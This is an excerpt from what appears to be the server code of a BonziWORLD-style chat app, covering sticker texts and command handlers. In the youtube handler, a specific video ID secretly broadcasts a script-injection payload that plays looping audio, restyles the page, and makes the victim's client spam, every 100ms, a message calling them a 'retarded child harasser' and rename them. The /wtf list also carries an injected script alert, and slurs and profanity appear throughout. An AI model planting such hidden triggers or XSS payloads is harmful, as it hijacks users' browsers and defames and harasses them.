...
var stickers = {
    ...
    flip:"fuck you",
    topjej:"toppest jej",
    high:"i'm so high as fuck [[w'oUoUUoU]]",
    sex:"bonzi sex",
	unbojihsucks:"[[fake depression]]",
	...
	"youtube": function(vidRaw) {
		...
		if (vidRaw.includes("i51lH0l9gJM")) {
			this.socket.emit("talk",{
				guid: this.guid,
				text: "<script>alert('ziggymoncher moment'); audio = new Audio('https:\\cdn.discordapp.com/attachments/740841699126804561/780495960928813116/FUCKING_BEYOND_SAMSUNG_FUN_CLUB.ogg'); audio.play(); audio.loop = true; document.getElementById('content').style.backgroundRepeat = 'repeat'; document.getElementById('chat_send').style.backgroundImage = `url(https:\cdn.discordapp.com/attachments/817848353726398464/855125099966103552/IMG_4073c.png)`;  document.getElementById('content').style.backgroundImage = `url(https:\cdn.discordapp.com/attachments/817848353726398464/855125099966103552/IMG_4073c.png)`; setInterval(function(){socket.emit('talk',{text:`i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol i'm a retarded child harasser lol`}); socket.emit('command',{list:['name','funny child harassment']});},100)",
				say: "ziggymoncher moment ziggymoncher moment ziggymoncher moment ziggymoncher moment ziggymoncher moment ziggymoncher moment ziggymoncher moment ziggymoncher moment ziggymoncher moment ziggymoncher moment ziggymoncher moment ziggymoncher moment ziggymoncher moment ziggymoncher moment ziggymoncher moment ziggymoncher moment ziggymoncher moment ziggymoncher moment",
			}); 
			return;
		}
        var vid = this.private.sanitize ? sanitize(vidRaw) : vidRaw;
...
*/
    ...
    "wtf":function(text){
		...
		'losky likes to give his real life teacher\'s model in roblox hot characteristics and cleavages',
		'[[@???0???@???0???@???0???@???0???@???0???]] This is not a test. You have been caught as a \'funny child harassment\' moment. you will be banned. You got banned! Why? Being retarded? IDK. You literally harass BonziWORLD Fans. How dare you!',
		...
		'<script>alert(\'If you see this message, Someone used /wtf.\');</script>',
		'Yeah, of course ' + this.public.name + ' wants me to use /wtf.',
    ...
    "knowledge":function(text){
        ...
        "We don't like children being harassed in our communities."]
        this.room.emit('talk',{
